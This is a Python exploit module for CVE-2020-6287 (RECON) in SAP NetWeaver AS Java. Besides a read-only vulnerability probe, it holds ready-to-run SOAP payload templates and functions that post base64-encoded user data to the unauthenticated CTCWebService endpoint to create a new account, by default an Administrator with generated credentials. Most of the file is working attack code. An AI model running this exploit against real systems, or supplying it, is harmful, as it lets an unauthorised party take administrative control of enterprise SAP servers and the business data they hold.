#!/usr/bin/env python3
"""
CVE-2020-6287 (RECON) + CVE-2020-6286 — SAP NetWeaver AS Java
LM Configuration Wizard unauthenticated admin-user creation.

Three entry points:
  - check_cve_2020_6287()            safe HEAD/GET probe
  - exploit_create_user()            create UME user via CTCWebService SOAP
  - exploit_create_admin()           shorthand for role=Administrator

The SOAP templates are reproduced from chipik/SAP_RECON on GitHub.
"""

from __future__ import annotations

import base64
import logging
import random
import ssl
import urllib.error
import urllib.request
from typing import Optional

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")

_CTC_PATH = "/CTCWebService/CTCWebServiceBean"
_LMC_PATH = "/LMConfigurationWizard"


# ---------------------------------------------------------------------------
# SOAP templates (from chipik/SAP_RECON)
# ---------------------------------------------------------------------------

_SOAP_ADMIN_USER = """\
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:CTCWebServiceSi">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:executeSynchronious>
      <identifier>
        <component>sap.com/tc~lm~config~content</component>
        <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
      </identifier>
      <contextMessages>
        <baData>{ba_data}</baData>
        <name>Netweaver.PI_PCK.PCK</name>
      </contextMessages>
    </urn:executeSynchronious>
  </soapenv:Body>
</soapenv:Envelope>"""

_SOAP_PLAIN_USER = """\
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:CTCWebServiceSi">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:executeSynchronious>
      <identifier>
        <component>sap.com/tc~lm~config~content</component>
        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
        <type></type>
      </identifier>
      <contextMessages>
        <baData>{ba_data}</baData>
        <name>userDetails</name>
      </contextMessages>
    </urn:executeSynchronious>
  </soapenv:Body>
</soapenv:Envelope>"""

# baData payloads: base64 of an XML blob the CTC metamodel parses as the
# new user's attributes.  Structures taken verbatim from chipik/SAP_RECON.

# Admin path (PCKProcess.cproc / name=Netweaver.PI_PCK.PCK).
# {rand} is a throw-away role-name placeholder for the non-admin roles;
# only the first Administrator assignment actually creates the admin.
_BA_ADMIN = """\
<PCK>
  <Usermanagement>
    <SAP_XI_PCK_CONFIG>
      <roleName>Administrator</roleName>
    </SAP_XI_PCK_CONFIG>
    <SAP_XI_PCK_COMMUNICATION>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_COMMUNICATION>
    <SAP_XI_PCK_MONITOR>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_MONITOR>
    <SAP_XI_PCK_ADMIN>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_ADMIN>
    <PCKUser>
      <userName secure="true">{username}</userName>
      <password secure="true">{password}</password>
    </PCKUser>
    <PCKReceiver>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKReceiver>
    <PCKMonitor>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKMonitor>
    <PCKAdmin>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKAdmin>
  </Usermanagement>
</PCK>"""

# Plain user path (SPC_UserManagement.cproc / name=userDetails).
_BA_PLAIN = ("<root><user><JavaOrABAP>java</JavaOrABAP>"
             "<username>{username}</username>"
             "<password>{password}</password>"
             "<userType>J</userType></user></root>")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_url(host: str, port: int, path: str, use_https: bool) -> str:
    scheme = "https" if use_https else "http"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}{path}"


def _head(url: str, timeout: float) -> int:
    """HEAD request — return HTTP status, 0 on network error."""
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, method="HEAD",
                                  headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _get(url: str, timeout: float) -> int:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _post_soap(url: str, body: str, timeout: float) -> tuple:
    """POST a SOAP body. Returns (status, response_text, error_str).

    A read-timeout is reported with status=-1 so callers can distinguish
    it from a hard network error (status=0).  The chipik PoC treats a
    read-timeout on the admin path as a success signal.
    """
    ctx = ssl._create_unverified_context()
    data = body.encode("utf-8")
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"User-Agent": _UA,
                 "Content-Type": "text/xml;charset=UTF-8"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("latin1", errors="replace"), ""
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode("latin1", errors="replace")
        except Exception:
            body_text = ""
        return e.code, body_text, ""
    except TimeoutError as e:
        return -1, "", f"read timeout after {timeout}s"
    except (urllib.error.URLError, OSError) as e:
        msg = str(e)
        if "timed out" in msg.lower() or "timeout" in msg.lower():
            return -1, "", msg
        return 0, "", msg


# ---------------------------------------------------------------------------
# Scanner (non-destructive)
# ---------------------------------------------------------------------------

def check_cve_2020_6287(host: str, port: int = 50000,
                          use_https: bool = False,
                          timeout: float = 10.0) -> dict:
    """Safe probe for CVE-2020-6287 (RECON).

    HEAD /CTCWebService/CTCWebServiceBean → 200 means vulnerable.
    Fallback: GET /LMConfigurationWizard → 200 also suggests the wizard
    is exposed.  Both are idempotent read-only requests.

    Returns dict:
        vulnerable, reachable, http_status, evidence, url
    """
    result = {"vulnerable": False, "reachable": False,
              "http_status": 0, "evidence": "", "url": ""}

    # Primary check: HEAD on CTCWebService
    url = _build_url(host, port, _CTC_PATH, use_https)
    result["url"] = url
    status = _head(url, timeout)
    result["http_status"] = status

    if status == 0:
        result["evidence"] = "network error / port not reachable"
        return result

    result["reachable"] = True

    if status == 200:
        result["vulnerable"] = True
        result["evidence"] = (
            "CTCWebService responded HTTP 200 to HEAD — "
            "LM Configuration Wizard is exposed without authentication")
        return result

    if status == 404:
        result["evidence"] = (
            "CTCWebService returned 404 — endpoint removed or patched "
            "(SAP Note 2934135 applied)")
        return result

    if status == 403:
        result["evidence"] = "CTCWebService returned 403 — access restricted"
        return result

    # Fallback: try the LMConfigurationWizard URL
    url2 = _build_url(host, port, _LMC_PATH, use_https)
    status2 = _get(url2, timeout)
    if status2 == 200:
        result["vulnerable"] = True
        result["http_status"] = status2
        result["evidence"] = (
            f"CTCWebService HEAD={status} but /LMConfigurationWizard "
            f"responded HTTP 200 — wizard UI is accessible")
        result["url"] = url2
        return result

    result["evidence"] = (
        f"CTCWebService HEAD={status}, "
        f"LMConfigurationWizard GET={status2} — probably not vulnerable")
    return result


# ---------------------------------------------------------------------------
# Exploit — user creation
# ---------------------------------------------------------------------------

def exploit_create_user(host: str, port: int, username: str, password: str,
                          role: str = "Administrator",
                          use_https: bool = False,
                          timeout: float = 20.0) -> dict:
    """Create a Java UME user via CVE-2020-6287 (RECON).

    Args:
        role: "Administrator" for admin-level access, "J" for a regular
              Java user.

    Returns dict:
        success, http_status, username, password, role, evidence, url
    """
    url = _build_url(host, port, _CTC_PATH, use_https)
    result = {"success": False, "http_status": 0,
              "username": username, "password": password,
              "role": role, "evidence": "", "url": url}

    if role.lower() in ("administrator", "admin"):
        rand_val = f"ThisIsRnd{random.randint(5000, 10000)}"
        ba_raw = _BA_ADMIN.format(username=username, password=password,
                                   rand=rand_val)
        soap_template = _SOAP_ADMIN_USER
    else:
        ba_raw = _BA_PLAIN.format(username=username, password=password)
        soap_template = _SOAP_PLAIN_USER

    ba_data = base64.b64encode(ba_raw.encode("utf-8")).decode("ascii")
    soap_body = soap_template.format(ba_data=ba_data)

    status, text, err = _post_soap(url, soap_body, timeout)
    result["http_status"] = status

    is_admin = role.lower() in ("administrator", "admin")

    # Read-timeout on the admin path is a documented success signal —
    # the CTC wizard processes the payload for a long time after the
    # user has already been created.  The chipik PoC does the same.
    if status == -1:
        if is_admin:
            result["success"] = True
            result["evidence"] = (
                "Read-timeout from CTCWebService — the wizard typically "
                "creates the admin user before it finishes processing, "
                "so treat as probable success (verify via UME).")
            return result
        result["evidence"] = f"read timeout: {err}"
        return result

    if status == 0 and err:
        result["evidence"] = f"network error: {err}"
        return result

    text_low = text.lower()

    # Success: HTTP 200 and no SOAP fault.
    if status == 200 and "fault" not in text_low:
        result["success"] = True
        result["evidence"] = ("CTCWebService accepted the user-creation "
                              "request (HTTP 200, no SOAP fault)")
        return result

    if "fault" in text_low:
        import re
        m = re.search(r"<faultstring[^>]*>(.*?)</faultstring>",
                       text, re.DOTALL | re.IGNORECASE)
        fault = m.group(1).strip() if m else text[:300]
        result["evidence"] = f"SOAP fault: {fault}"
        return result

    result["evidence"] = f"HTTP {status} — {text[:300]}"
    return result


def exploit_create_admin(host: str, port: int,
                           username: str = "", password: str = "",
                           use_https: bool = False,
                           timeout: float = 20.0) -> dict:
    """Convenience wrapper: create an Administrator-role user.

    If username/password are empty, generates random ones matching the
    PoC's naming convention (sapRpocNNNN / Secure!PwDNNNN).
    """
    if not username:
        n = random.randint(5000, 10000)
        username = f"sapRpoc{n}"
    if not password:
        n = random.randint(5000, 10000)
        password = f"Secure!PwD{n}"
    return exploit_create_user(host, port, username, password,
                                 role="Administrator",
                                 use_https=use_https, timeout=timeout)
